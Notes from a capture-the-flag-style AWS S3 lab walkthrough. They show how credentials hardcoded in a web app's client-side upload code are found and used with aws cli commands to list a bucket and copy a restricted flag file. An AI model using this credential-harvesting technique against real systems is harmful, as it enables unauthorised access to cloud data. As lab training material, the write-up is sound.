S3 is commonly used for storing static resources required by web applications and to store the uploaded files. While building out such applications, special care should be taken on how the file put mechanism is implemented. A poorly coded application can allow the attacker to misuse the S3 bucket.

In this lab, we will take a look at how a client-side put object implementation can provide attackers with additional privileges.   

**Objective:** Find the AWS access key id, access secret key, interact with the S3 bucket and retrieve the flag.

==================================================================

List s3 buckets --> `aws s3api list-buckets`
Check bucket objects --> `aws s3api list-objects --bucket s3-upload-423668550512`
![[Pasted image 20210825193424.png]]
Copy flag from s3 bucket --> `aws s3 cp s3://flag-42366550512/FLAG .`
Cannot copy flag due to insufficient permissions
![[Pasted image 20210825193735.png]]
check contents of other s3 buckets --> `aws s3api list-objects --bucket s3-upload-423668550512`
Check s3 URL format on AWS docs --> `https://<my_bucket>.s3.amazonaws.com`
Use s3 url format to open index.html --> `https://s3-upload-423668550512.s3.amazonaws.com/index.html`

Try uploading files on web application
Check source code of the web application --> AWS credentials are hardcoded inside source code.

Use credentials from source code to enumerate s3 buckets 
![[Pasted image 20210825194809.png]]
Try listing buckets --> `aws s3api list-buckets` --> Access Denied
As bucket names are already known, check bucket objects --> 
`aws s3api list-objects --bucket s3-upload-423668550512`
![[Pasted image 20210825195207.png]]

Copy flag from s3 bucket --> `aws s3 cp s3://flag-42366550512/FLAG .`
File downloaded successfully!


